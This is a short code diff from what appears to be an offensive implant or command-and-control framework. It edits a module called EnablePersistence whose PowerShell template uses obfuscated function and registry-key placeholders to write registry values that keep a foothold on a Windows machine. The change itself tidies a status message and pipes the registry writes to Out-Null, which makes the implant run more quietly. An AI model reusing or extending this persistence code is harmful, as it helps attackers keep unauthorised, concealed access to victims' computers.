@@ -8,7 +8,7 @@ class EnablePersistence:
         if data.decode() == "0":
             return f"Persistence already exists.", None
         else:
-            return f"Enable persistence:\n{data.decode()}", None
+            return f"Enabled persistence successfully.", None
 
     def implant_text(self):
         var = '''
@@ -22,8 +22,8 @@ function {{ ron.obf_create_persistence }}(){
     if ($key.Property -Like "{{ ron.obf_reg_key_name }}"){
         $global:tr = "0"
     } else {
-        New-ItemProperty -path $abc -Name {{ ron.obf_reg_key_name }} -Value $val -PropertyType "String"
-        New-ItemProperty -Path $def -Name State -Value $ec -PropertyType "String"
+        New-ItemProperty -path $abc -Name {{ ron.obf_reg_key_name }} -Value $val -PropertyType "String" | Out-Null
+        New-ItemProperty -Path $def -Name State -Value $ec -PropertyType "String" | Out-Null
         $global:tr = "1"
     }
 }'''
